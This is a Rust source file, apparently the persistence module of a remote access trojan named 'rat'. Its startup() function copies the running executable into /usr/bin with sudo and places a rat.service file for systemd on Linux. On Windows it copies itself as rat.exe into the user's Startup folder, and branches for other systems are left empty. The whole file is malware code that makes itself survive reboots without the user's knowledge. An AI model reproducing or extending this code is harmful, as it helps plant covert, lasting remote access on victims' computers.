use std::path::PathBuf;

pub fn startup() {
    if cfg!(target_os = "linux") {
        let current_exe_path = std::env::current_exe().unwrap();
        let _ = std::process::Command::new("sudo")
            .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
            .output();
        // create rat.service directly in /etc/systemd/system/multi-user.target
        // start and enable rat.service
        if let Ok(_) = std::process::Command::new("sudo")
            .args(["cp", "rat.service", "/etc/systemd/system/multi-user.target"])
            .output()
        {}
    } else if cfg!(target_os = "windows") {
        let mut user_startup_dir = PathBuf::with_capacity(96);
        user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
        user_startup_dir.push("/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        let current_exe_path = std::env::current_exe().unwrap();
        user_startup_dir.push("rat.exe");
        let _ = std::fs::copy(current_exe_path, user_startup_dir);
    } else if cfg!(target_os = "android") {
    } else if cfg!(target_os = "ios") {
    } else if cfg!(target_os = "macos") {
    }
}

// unsupported systems
// ["aix", "cuda", "dragonfly", "emscripten", "espidf",
// "freebsd", "fuchsia", "haiku", "hermit", "horizon", "hurd",
// "illumos", "l4re", "netbsd", "nto", "openbsd", "psp",
// "redox", "solaris", "solid_asp3", "teeos", "tvos", "uefi",
// "visionos", "vita", "vxworks", "wasi", "watchos"]
